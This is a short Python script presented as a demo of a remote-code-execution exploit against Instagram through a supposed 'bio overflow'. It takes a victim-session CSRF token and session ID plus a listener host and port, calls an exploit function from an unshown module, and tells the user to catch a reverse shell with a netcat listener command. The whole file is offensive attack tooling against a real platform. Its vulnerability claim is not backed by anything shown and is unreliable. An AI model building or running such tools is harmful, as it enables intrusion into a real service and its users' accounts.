#!/usr/bin/env python3
"""
Instagram RCE Exploit Demo
This script demonstrates how to use the Instagram RCE vulnerability
via bio overflow to gain remote code execution.
"""

import sys
import logging
from modules.exploit import SocialMediaExploiter

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def main():
    """Main function to execute the Instagram RCE exploit"""
    logger.info("🚀 Starting Instagram RCE Exploit Demo")
    
    # Check for required arguments
    if len(sys.argv) < 3:
        print("Usage: python instagram_rce_demo.py <CSRF_TOKEN> <SESSIONID> [LHOST] [LPORT]")
        print("\nExample:")
        print("python instagram_rce_demo.py ABC123xyz456 mysessionid123 192.168.1.100 4444")
        return
    
    csrf_token = sys.argv[1]
    session_id = sys.argv[2]
    lhost = sys.argv[3] if len(sys.argv) > 3 else "192.168.1.100"
    lport = int(sys.argv[4]) if len(sys.argv) > 4 else 4444
    
    logger.info(f"🎯 Target: Instagram")
    logger.info(f"🔑 CSRF Token: {csrf_token[:5]}...")
    logger.info(f"🍪 Session ID: {session_id[:5]}...")
    logger.info(f"📡 Listening on: {lhost}:{lport}")
    
    # Initialize exploit
    exploiter = SocialMediaExploiter()
    
    # Create session cookies
    session_cookies = {
        'sessionid': session_id,
        'csrftoken': csrf_token
    }
    
    try:
        # Execute the RCE exploit
        logger.info("🔍 Attempting RCE via bio overflow...")
        success = exploiter.exploit_instagram_rce(csrf_token, session_cookies, lhost, lport)
        
        if success:
            logger.info("✅ Exploit successful!")
            logger.warning("⚠️  Now check your Netcat listener for the reverse shell!")
            logger.warning("Run: nc -lvnp 4444")
        else:
            logger.error("❌ Exploit failed")
            return
    
    except Exception as e:
        logger.error(f"💥 Error: {e}")
        logger.error("Make sure you have a valid authenticated session")


if __name__ == "__main__":
    main()
